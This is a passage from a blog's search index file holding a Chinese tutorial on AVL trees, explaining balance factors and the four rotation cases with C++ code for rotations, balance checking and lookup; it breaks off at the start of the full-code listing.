<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>AVLTree旋转树</title>
    <link href="/project/2023/04/01/AVLTree%E6%97%8B%E8%BD%AC%E6%A0%91/"/>
    <url>/project/2023/04/01/AVLTree%E6%97%8B%E8%BD%AC%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>AVLTree旋转树 - 应对面试中的数据结构问题</p><span id="more"></span><p>AVL树是根据它的发明者G. M. Adelson-Velskii和E. M. Landis命名的。它是一种特殊的二叉搜索树。AVL树要求: 任一节点的左子树深度和右子树深度相差不超过1</p><p>(空树的深度为0。注意，有的教材中，采用了不同的深度定义方法，所以空树的深度为-1)</p><p>下面是AVL树:</p><p><img src="/project/AVL/AVL%E6%A0%91.png" alt="典型的AVL树"></p><p>我们可以发现，左边高，它的高度差就是 -1，右边高，高度差就是1。两边一样高，那么高度差就是 0 。所以我们可以用平衡因子，来确定它的一个高度差。这样可以更好的控制它的高度。</p><p>AVL树的节点创建<br>为了更好的控制，我们决定使用三叉链。也就是新增一个parent节点指向自己的父亲，根节点的父亲为空指针。而我们还要一个平衡因子变量，来记录它子树的高度差。left和right指针指向左右两个孩子。这里我们采取key,value模型，所以用pair结构体，作为节点的值。</p><p>节点结构体代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 非模板类实现</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">AVLNode</span> &#123;<br>    <span class="hljs-type">int</span> val;  <span class="hljs-comment">// 节点值</span><br>    <span class="hljs-type">int</span> height;<span class="hljs-comment">// 节点高度</span><br>    AVLNode* left;<span class="hljs-comment">// 左子节点指针</span><br>    AVLNode* right;<span class="hljs-comment">// 右子节点指针</span><br>    <span class="hljs-built_in">AVLNode</span>(<span class="hljs-type">int</span> v) : <span class="hljs-built_in">val</span>(v), <span class="hljs-built_in">height</span>(<span class="hljs-number">1</span>), <span class="hljs-built_in">left</span>(<span class="hljs-literal">nullptr</span>), <span class="hljs-built_in">right</span>(<span class="hljs-literal">nullptr</span>) &#123;&#125; <span class="hljs-comment">// 构造函数</span><br>&#125;;<br><span class="hljs-comment">// 模板类实现</span><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">K</span>,<span class="hljs-keyword">class</span> <span class="hljs-title class_">V</span>&gt;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">AVLNode</span><br>&#123;<br>AVLNode&lt;K, V&gt;* _left; <span class="hljs-comment">// 左子节点指针</span><br>AVLNode&lt;K, V&gt;* _right;<span class="hljs-comment">// 右子节点指针</span><br>AVLNode&lt;K, V&gt;* _parent;<br><span class="hljs-type">int</span> _bf; <span class="hljs-comment">//平衡因子，记录高度差</span><br>pair&lt;K, V&gt; _kv; <span class="hljs-comment">//存储的一对数据</span><br><span class="hljs-comment">//构造函数</span><br><span class="hljs-built_in">AVLNode</span>(<span class="hljs-type">const</span> pair&lt;K,V&gt;&amp; kv)<br>:_left(<span class="hljs-literal">nullptr</span>)<br>,_right(<span class="hljs-literal">nullptr</span>)<br>,_parent(<span class="hljs-literal">nullptr</span>)<br>,_bf(<span class="hljs-number">0</span>) <span class="hljs-comment">//新增节点肯定是叶子节点，所以高度默认0</span><br>,_kv(kv)&#123;&#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h1 id="AVL类创建"><a href="#AVL类创建" class="headerlink" title="AVL类创建"></a>AVL类创建</h1><p>只需要一个成员变量 root 来指向整颗树的根即可。构造函数就把root初始化为空。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">K</span>, <span class="hljs-keyword">class</span> <span class="hljs-title class_">V</span>&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AVLTree</span><br>&#123;<br><span class="hljs-keyword">typedef</span> AVLNode&lt;K, V&gt; Node;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">AVLTree</span>() :_root(<span class="hljs-literal">nullptr</span>)&#123;&#125;<br><span class="hljs-keyword">private</span>:<br>Node* _root;<span class="hljs-comment">//AVL树的根</span><br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="AVL树的插入"><a href="#AVL树的插入" class="headerlink" title="AVL树的插入"></a>AVL树的插入</h1><p>AVL树的插入，我们要先找到可以插入的位置，然后插入。插入之后我们树的高度可能会发生变化，因此我们需要向上去更新平衡因子。所以我们插入后分多种情况，那就是插入后平衡因子为 0, 1/-1 ，2/-2的情况</p><h4 id="插入后平衡因子为0的情况："><a href="#插入后平衡因子为0的情况：" class="headerlink" title="插入后平衡因子为0的情况："></a>插入后平衡因子为0的情况：</h4><p>插入后平衡因子为0，那么说明在插入之前，这颗树的平衡因子是 -1 或者1，所以在插入之后这棵树的平衡因子变成了0，那么就意味着这棵树已经平衡了，这种情况就不需要做什么事情了。<br><img src="/project/AVL/%E6%8F%92%E5%85%A5%E5%90%8E%E5%B9%B3%E8%A1%A1%E5%9B%A0%E5%AD%90%E4%B8%BA0%E7%9A%84%E6%83%85%E5%86%B5.png" alt="插入后平衡因子为0的情况"></p><h4 id="插入后平衡因子为1-1的情况："><a href="#插入后平衡因子为1-1的情况：" class="headerlink" title="插入后平衡因子为1/-1的情况："></a>插入后平衡因子为1/-1的情况：</h4><p>如果插入和平衡因子为1或者-1，说明在插入之前这棵树的平衡因子是0。也就是说插入之前这颗树是平衡的，而插入之后，引发了高度变化。所以可能会造成不平衡的情况，这种情况我们需要一种往上更新平衡因子。在更新的过程可能会遇到平衡因子变成 2 或者 -2的情况，这时候就需要发生旋转。</p><p><img src="/project/AVL/%E6%8F%92%E5%85%A5%E5%90%8E%E5%B9%B3%E8%A1%A1%E5%9B%A0%E5%AD%90%E4%B8%BA1%E6%88%96-1%E7%9A%84%E6%83%85%E5%86%B5.gif" alt="插入后平衡因子为1/-1的情况"></p><h4 id="插入后平衡因子为2-2的情况："><a href="#插入后平衡因子为2-2的情况：" class="headerlink" title="插入后平衡因子为2/-2的情况："></a>插入后平衡因子为2/-2的情况：</h4><p>在插入的过程中，平衡因子可能会出现为2/-2的情况。当平衡因子为1/-1的时候，会一直往上更新，而在更新的过程中就会发生平衡因子为 2/-2的情况，这种情况我们就需要发生旋转。</p><p><img src="/project/AVL/%E5%B9%B3%E8%A1%A1%E5%9B%A0%E5%AD%90%E4%B8%BA2%E6%88%96-2%E7%9A%84%E6%83%85%E5%86%B5.png" alt="插入后平衡因子为1/-1的情况"></p><p>假设我们插入一个10，那么10插入的位置应该在 8的右边。</p><p><img src="/project/AVL/%E6%8F%92%E5%85%A510.png" alt="插入一个10"></p><p>那么此时 8 的左右子树高度发生了变化，因为插入了一个新节点。如果新增节点在右边，则 平衡因子自减，如果新增节点在右边，则平衡因子自增。所以新增后，平衡因子的变化是。</p><p><img src="/project/AVL/%E6%8F%92%E5%85%A510%E5%90%8E%E7%9A%84%E5%8F%98%E5%8C%96.png" alt="插入10的变化"></p><p>也就是，7所在的节点的子树不平衡了，因为它的平衡因子 &gt; 1了。所以此时我们要发生旋转。而旋转有四种情况。</p><h4 id="第一种情况，右边一边高"><a href="#第一种情况，右边一边高" class="headerlink" title="第一种情况，右边一边高"></a>第一种情况，右边一边高</h4><p>就如上图的情况，7所在节点的右子树右边一边高，所以这时候我们需要左旋转。那么我们假设7节点为parent。7的右节点8为subR，8的左节点为subRL，而7的父节点为grandparent<br><img src="/project/AVL/%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%83%85%E5%86%B5.png" alt="第一种情况"></p><p>左单旋的步骤:<br><strong>1.让parent的右节点连接subRL</strong><br><strong>2.subRL的父节点连接parent，如果为空则不连接</strong><br><strong>3.subR的左节点连接parent</strong><br><strong>4.parent的父节点连接subR</strong><br><strong>5.grandparent与subR连接</strong></p><p>旋转流程图</p><p><img src="/project/AVL/%E5%B7%A6%E5%8D%95%E6%97%8B.gif" alt="左单旋"></p><p>最后，我们会发现parent和subR的平衡因子都变了0。也就意味着这颗子树达到了平衡。<br>左旋转代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 左单旋</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">RotateL</span><span class="hljs-params">(Node* parent)</span></span><br><span class="hljs-function"></span>&#123;<br>Node* grandparent = parent-&gt;_parent;<br>Node* subR = parent-&gt;_right;<br>Node* subRL = subR-&gt;_left;<br><span class="hljs-comment">//父亲连接subRL</span><br>parent-&gt;_right = subRL;<br><span class="hljs-keyword">if</span> (subRL)<br>subRL-&gt;_parent = parent;<br><br><span class="hljs-comment">//subR的左边连接parent</span><br>subR-&gt;_left = parent;<br>parent-&gt;_parent = subR;<br><span class="hljs-comment">//grandparent连接subR</span><br><span class="hljs-keyword">if</span> (grandparent == <span class="hljs-literal">nullptr</span>)<br>&#123;<br><span class="hljs-comment">//grandparent为空，说明parent一开始是根节点</span><br>_root = subR;<br>subR-&gt;_parent = <span class="hljs-literal">nullptr</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-comment">//如果parent一开是grandparent的左子树，则grandparent的左子树连接subR</span><br><span class="hljs-keyword">if</span> (parent == grandparent-&gt;_left)<br>grandparent-&gt;_left = subR;<br><span class="hljs-keyword">else</span><br>grandparent-&gt;_right = subR;<br>subR-&gt;_parent = grandparent;<br>&#125;<br><span class="hljs-comment">//更新平衡因子</span><br>parent-&gt;_bf = subR-&gt;_bf = <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="第二种情况：左边一边高"><a href="#第二种情况：左边一边高" class="headerlink" title="第二种情况：左边一边高"></a>第二种情况：左边一边高</h4><p>左边一边高和右边一边高的思路完全一样。只不过方向反过来。。下面这棵树就是左边一边高，所以我们用右单旋进行调整。</p><p>右单旋的步骤:<br><strong>1.让parent的左节点连接subLR</strong><br><strong>2.subLR的父节点连接parent，如果为空则不连接</strong><br><strong>3.subL的右节点连接parent</strong><br><strong>4.parent的父节点连接subL</strong><br><strong>5.grandparent与subL连接</strong></p><p>右单旋旋转动图:</p><p><img src="/project/AVL/%E5%8F%B3%E5%8D%95%E6%97%8B.gif" alt="右单旋"></p><p>右单旋代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//右单旋</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">RotateR</span><span class="hljs-params">(Node* parent)</span></span><br><span class="hljs-function"></span>&#123;<br>Node* subL = parent-&gt;_left;<br>Node* subLR = subL-&gt;_right;<br>Node* grandpraent = parent-&gt;_parent;<br>parent-&gt;_left = subLR;<br><span class="hljs-keyword">if</span> (subLR)<br>subLR-&gt;_parent = parent;<br><br>subL-&gt;_right = parent;<br>parent-&gt;_parent = subL;<br><span class="hljs-keyword">if</span> (grandpraent == <span class="hljs-literal">nullptr</span>)<br>&#123;<br>_root = subL;<br>subL-&gt;_parent = <span class="hljs-literal">nullptr</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">if</span> (grandpraent-&gt;_left == parent)<br>grandpraent-&gt;_left = subL;<br><span class="hljs-keyword">else</span><br>grandpraent-&gt;_right = subL;<br>subL-&gt;_parent = grandpraent;<br>&#125;<br>subL-&gt;_bf = parent-&gt;_bf = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="第三种情况：新节点插入较高左子树的右侧—左右"><a href="#第三种情况：新节点插入较高左子树的右侧—左右" class="headerlink" title="第三种情况：新节点插入较高左子树的右侧—左右"></a>第三种情况：新节点插入较高左子树的右侧—左右</h4><p>一边高是直线，曲线就是整棵树是左边高，但是它的孩子却在和它相反的一边。这就意味着这棵树是曲线的，所以单纯的左右旋转无法使它达到平衡。而旋转完后，我们还需要控制平衡因子，控制平衡因子又有三种情况。</p><h5 id="情况1-当subL右节点的平衡因子为0时-也就是新增"><a href="#情况1-当subL右节点的平衡因子为0时-也就是新增" class="headerlink" title="情况1.当subL右节点的平衡因子为0时(也就是新增)"></a>情况1.当subL右节点的平衡因子为0时(也就是新增)</h5><p><img src="/project/AVL/%E4%B8%89%E6%83%85%E5%86%B5%E4%B8%80.png" alt="情况1"></p><p><strong>把subL左旋转后</strong></p><p><img src="/project/AVL/subl%E5%B7%A6%E6%97%8B%E5%90%8E.png" alt="subL左旋转后"></p><p>随后这颗树就变成了左边一边高，我们再把parent右旋转。</p><p><img src="/project/AVL/parent%E5%8F%B3%E6%97%8B.png" alt="parent右旋"></p><p>这种情况下，新增节点，subL，parent的平衡因子都变成了0。</p><h5 id="情况2-subL的右节点平衡因子为-1时"><a href="#情况2-subL的右节点平衡因子为-1时" class="headerlink" title="情况2.subL的右节点平衡因子为-1时"></a>情况2.subL的右节点平衡因子为-1时</h5><p><img src="/project/AVL/%E5%8F%B3%E8%8A%82%E7%82%B9%E5%B9%B3%E8%A1%A1%E5%9B%A0%E5%AD%90%E4%B8%BA-1.png" alt="右节点平衡因子为-1"></p><p><strong>和之前一样，先把subL左旋转</strong></p><p><img src="/project/AVL/subL%E5%B7%A6%E6%97%8B%E8%BD%AC.gif" alt="subL左旋转"></p><p><strong>再把parent右旋转</strong></p><p><img src="/project/AVL/parent%E5%8F%B3%E6%97%8B%E8%BD%AC.gif" alt="parent右旋转"></p><p>旋转后<br>subL的平衡因子为0<br>subLR的平衡因子为0<br>parent的平衡因子为1</p><h5 id="情况3-subL的右节点平衡因子为1时"><a href="#情况3-subL的右节点平衡因子为1时" class="headerlink" title="情况3.subL的右节点平衡因子为1时"></a>情况3.subL的右节点平衡因子为1时</h5><p><img src="/project/AVL/%E5%8F%B3%E8%8A%82%E7%82%B9%E5%B9%B3%E8%A1%A1%E5%9B%A0%E5%AD%90%E4%B8%BA1.png" alt="右节点平衡因子为1"></p><p><strong>老规矩，把subL进行左单旋</strong></p><p><img src="/project/AVL/subL%E5%B7%A6%E5%8D%95%E6%97%8B.gif" alt="subL左单旋"></p><p><strong>再把parent右单旋</strong></p><p><img src="/project/AVL/parent%E5%8F%B3%E5%8D%95%E6%97%8B.gif" alt="parent右单旋"></p><p>旋转后<br>subL的平衡因子为-1<br>subLR的平衡因子为0<br>parent的平衡因子为0</p><p>左右双旋代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">RotateLR</span><span class="hljs-params">(Node* parent)</span></span><br><span class="hljs-function"></span>&#123;<br>Node* subL = parent-&gt;_left;<br>Node* subLR = subL-&gt;_right;<br><span class="hljs-type">int</span> lrbf = subLR-&gt;_bf;<br><br><span class="hljs-comment">//先左旋subL</span><br><span class="hljs-built_in">RotateL</span>(subL);<br><span class="hljs-comment">//右旋parent</span><br><span class="hljs-built_in">RotateR</span>(parent);<br><span class="hljs-comment">//保存LR的平衡因子</span><br><span class="hljs-keyword">if</span> (lrbf == <span class="hljs-number">0</span>)<br>&#123;<br>parent-&gt;_bf = subL-&gt;_bf = subLR-&gt;_bf = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (lrbf == <span class="hljs-number">-1</span>)<br>&#123;<br>subL-&gt;_bf = subLR-&gt;_bf = <span class="hljs-number">0</span>;<br>parent-&gt;_bf = <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (lrbf == <span class="hljs-number">1</span>)<br>&#123;<br>subL-&gt;_bf = <span class="hljs-number">-1</span>;<br>subLR-&gt;_bf = parent-&gt;_bf = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">assert</span>(<span class="hljs-literal">false</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="第四种情况：新节点插入较高右子树的左侧—右左"><a href="#第四种情况：新节点插入较高右子树的左侧—右左" class="headerlink" title="第四种情况：新节点插入较高右子树的左侧—右左"></a>第四种情况：新节点插入较高右子树的左侧—右左</h4><p>这种情况和第三种情况相反，但也另外分了三种情况。</p><h5 id="情况1-subRL就是新增节点"><a href="#情况1-subRL就是新增节点" class="headerlink" title="情况1.subRL就是新增节点"></a>情况1.subRL就是新增节点</h5><p><img src="/project/AVL/subRL%E5%B0%B1%E6%98%AF%E6%96%B0%E5%A2%9E%E8%8A%82%E7%82%B9.png" alt="subRL就是新增节点"></p><p><strong>先右旋转subR</strong></p><p><img src="/project/AVL/%E5%85%88%E5%8F%B3%E6%97%8BsubR.png" alt="先右旋subR"></p><p><strong>再左旋转parent</strong></p><p><img src="/project/AVL/%E5%B7%A6%E6%97%8Bparent.png" alt="再左旋subR"></p><p>旋转完后，subRL和subR还有parent的平衡因子都为0。</p><h5 id="情况2-当在subRL的平衡因子为-1时"><a href="#情况2-当在subRL的平衡因子为-1时" class="headerlink" title="情况2.当在subRL的平衡因子为-1时"></a>情况2.当在subRL的平衡因子为-1时</h5><p><img src="/project/AVL/subRL%E5%B9%B3%E8%A1%A1%E5%9B%A0%E5%AD%90%E4%B8%BA-1.png" alt="subRL的平衡因子为-1"></p><p><strong>先右单旋subR</strong></p><p><img src="/project/AVL/%E5%8F%B3%E5%8D%95%E6%97%8BsubR.gif" alt="右单旋subR"></p><p><strong>再左单旋parent</strong></p><p><img src="/project/AVL/%E5%B7%A6%E5%8D%95%E6%97%8Bparent.gif" alt="左单旋parent"></p><p>最后的平衡因子分别为:<br>subRL 0<br>parent 0<br>subR 1</p><h5 id="情况3-当在subRL的平衡因子为1时"><a href="#情况3-当在subRL的平衡因子为1时" class="headerlink" title="情况3.当在subRL的平衡因子为1时"></a>情况3.当在subRL的平衡因子为1时</h5><p><img src="/project/AVL/subRL%E7%9A%84%E5%B9%B3%E8%A1%A1%E5%9B%A0%E5%AD%90%E4%B8%BA1.png" alt="subRL的平衡因子为1"></p><p><strong>老规矩，先右旋 subR</strong></p><p><img src="/project/AVL/%E5%8F%B3%E6%97%8BsubR.gif" alt="右旋subR"></p><p><strong>然后左旋转parent</strong></p><p><img src="/project/AVL/%E5%B7%A6%E6%97%8Bparent.gif" alt="左旋parent"></p><p>最后的平衡因子分别是：<br>parent -1<br>subRL 0<br>subR 0</p><p>右左双旋代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//右左双旋</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">RotateRL</span><span class="hljs-params">(Node* parent)</span></span><br><span class="hljs-function"></span>&#123;<br>Node* subR = parent-&gt;_right;<br>Node* subRL = subR-&gt;_left;<br><span class="hljs-type">int</span> rlbf = subRL-&gt;_bf;<br><span class="hljs-built_in">RotateR</span>(subR);<br><span class="hljs-built_in">RotateL</span>(parent);<br><span class="hljs-keyword">if</span> (rlbf == <span class="hljs-number">0</span>)<br>&#123;<br>subR-&gt;_bf = subRL-&gt;_bf = parent-&gt;_bf = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rlbf == <span class="hljs-number">-1</span>)<br>&#123;<br>subRL-&gt;_bf = parent-&gt;_bf = <span class="hljs-number">0</span>;<br>subR-&gt;_bf = <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rlbf == <span class="hljs-number">1</span>)<br>&#123;<br>parent-&gt;_bf = <span class="hljs-number">-1</span>;<br>subR-&gt;_bf = subRL-&gt;_bf = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">assert</span>(<span class="hljs-literal">false</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="检查AVL树是否正常"><a href="#检查AVL树是否正常" class="headerlink" title="检查AVL树是否正常"></a>检查AVL树是否正常</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">IsBalance</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> _IsBalance(_root);<br>&#125;<br><br><span class="hljs-type">bool</span> _IsBalance(Node* root)<br>&#123;<br><span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br><span class="hljs-type">int</span> LeftHeight = _Height(root-&gt;_left);<br><span class="hljs-type">int</span> RightHeight = _Height(root-&gt;_right);<br><span class="hljs-keyword">if</span> (root-&gt;_bf != RightHeight - LeftHeight)<br>&#123;<br>cout &lt;&lt; root-&gt;_kv._first &lt;&lt;<span class="hljs-string">&quot;现在是平衡因子是:&quot;</span> &lt;&lt; root-&gt;_bf &lt;&lt; endl;<br>cout &lt;&lt; root-&gt;_kv._first &lt;&lt;<span class="hljs-string">&quot;平衡因子应该是:&quot;</span> &lt;&lt; RightHeight - LeftHeight &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">abs</span>(LeftHeight - RightHeight) &lt; <span class="hljs-number">2</span>;<br>&#125;<br><br><span class="hljs-type">int</span> _Height(Node* root)<br>&#123;<br><span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-type">int</span> leftHeight = _Height(root-&gt;_left);<br><span class="hljs-type">int</span> rightHeight = _Height(root-&gt;_right);<br><span class="hljs-keyword">return</span> leftHeight &gt; rightHeight ? leftHeight + <span class="hljs-number">1</span> : rightHeight + <span class="hljs-number">1</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="查找值"><a href="#查找值" class="headerlink" title="查找值"></a>查找值</h1><p>直接查找即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//查找</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Find</span><span class="hljs-params">(<span class="hljs-type">const</span> K&amp; k)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (_root == <span class="hljs-literal">nullptr</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>Node* cur = _root;<br><span class="hljs-keyword">while</span> (cur)<br>&#123;<br><span class="hljs-keyword">if</span> (cur-&gt;_kv.first &gt; k)<br>cur = cur-&gt;_left;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cur-&gt;_kv.first &lt; k)<br>cur = cur-&gt;_right;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>全部代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span 